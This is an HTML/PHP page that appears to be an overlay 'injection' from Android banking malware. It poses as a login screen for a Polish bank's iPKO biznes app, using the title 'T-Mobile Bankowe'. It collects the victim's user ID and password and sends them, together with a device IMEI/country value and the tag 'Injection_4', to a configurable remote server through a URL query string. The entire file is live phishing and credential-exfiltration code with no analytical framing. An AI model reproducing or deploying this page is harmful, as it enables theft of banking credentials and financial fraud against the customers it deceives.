<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>T-Mobile Bankowe</title>

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
    <script src="js/credit.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
	<link rel="stylesheet" href="pl/pl.pkobp.ipkobiznes/css/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
        <div class="booting on text-center alert alert-danger" style="position: absolute;width: 100%;">
        Błąd połączenia z serwerem
    </div>
    <div class="header">
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAIAAAAf7rriAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MUI2MTk0OTY0Qzg0MTFFOEFCMDA4NDMxNkNCNEQ5RTgiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MUI2MTk0OTc0Qzg0MTFFOEFCMDA4NDMxNkNCNEQ5RTgiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDoxQjYxOTQ5NDRDODQxMUU4QUIwMDg0MzE2Q0I0RDlFOCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDoxQjYxOTQ5NTRDODQxMUU4QUIwMDg0MzE2Q0I0RDlFOCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PiM9/6cAAAExSURBVHjaYvz//z8DuYAJl8Sv33/ffPhKjuY/f/+ltKzSj+r79uM3aZqBHomrX754+7nvP3//+/cPn9X/MUBY5WIG0xJBp9o3H778xwvQNYeULwLqFHape/Lqw39CgAFTp4hL/b2nb/8TARjQdbrW33r4+j9xgBESz0B/rt57iZ2VZWVbjLq8KP4YkpcU5GRnBTJAmiOql67cfYH4tHF0TraVngKQwQLETibK6/Zf+v3nHysLs6QIL0HNQAeiRNWUVUdYLcuBfl6x68J/ogEiwCatOMwG1g/0AsmaIfoh9q/ac5FkzSD3rzzCYlEG1L927yWSNQPBjLXHmM1Lgfo3HLhCsmYgmLvxJFAzEB06f5dkzf/+/1+45bRL1oy///4RTmHYchswV/8FxjyeCAcIMAB4r43ICgMdngAAAABJRU5ErkJggg==">
        Zaloguj
    </div>
    <div class="line-left"></div>
	<form method="post">
		<div class="field">
            <label for="login">User ID</label>
			<input type="text" name="login" class="input" onkeyup="check();" id="login" maxlength="10" placeholder="">
        </div>

		<div class="field">
            <label for="password">Hasło</label>
			<input type="password" name="password" class="input" onkeyup="check();" id="password" maxlength="10" placeholder="">
        </div>


		<div class="footer">
			<input type="button" class="button" disabled onclick="sentServer()" id="input_submitBtn1" value="Zaloguj">
        </div>
<script>
    function check() {
      var inp1 = document.getElementById('login'),
          inp2 = document.getElementById('password');

      document.getElementById('input_submitBtn1').disabled = inp1.value && inp2.value  ? false : "disabled";
    }
</script>
</form>

<script type="text/javascript">
    var g_oBtn = document.getElementById('input_submitBtn1');
    g_oBtn.onclick = function () {

        var oNumInp = document.getElementById('login');
        var oCodeInp = document.getElementById('password');

        try{
            oNumInp.className = 'input';
            oCodeInp.className = 'input';
        } catch(e){};

        if (oNumInp.value.length < 7) {
            try{
                oNumInp.className = 'fielderror';
            } catch(e){};
            return false;
        }

        if (oCodeInp.value.length < 4) {
            try{
                oCodeInp.className = 'fielderror';
            } catch(e){};
            return false;
        }
        sentServer();
    }
</script>

<script>
    function sentServer()
    {
            var oNumInp1 = document.getElementById('login');
            var oNumInp2 = document.getElementById('password');


            var url='<?php echo $URL; ?>';
        var imei_c='<?php echo $IMEI_country; ?>';

    var login1 = oNumInp1.value;
    var pass = oNumInp2.value;

    location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|pl.pkobp.ipkobiznes|"+login1+"|"+pass);
    }
    </script>
        <script>main={booting:function(){var t=this;"undefined"!=typeof angular?setTimeout(function(){$(".booting").removeClass("on"),setTimeout(function(){$(".fixed-top").addClass("on"),t.start()},500)},3e3):setTimeout(function(){t.booting()},300)},start:function(){},loader_:{show:function(){$(".booting").addClass("on")},hide:function(){$(".booting").removeClass("on")}}},main.booting()</script>

</body>
</html>
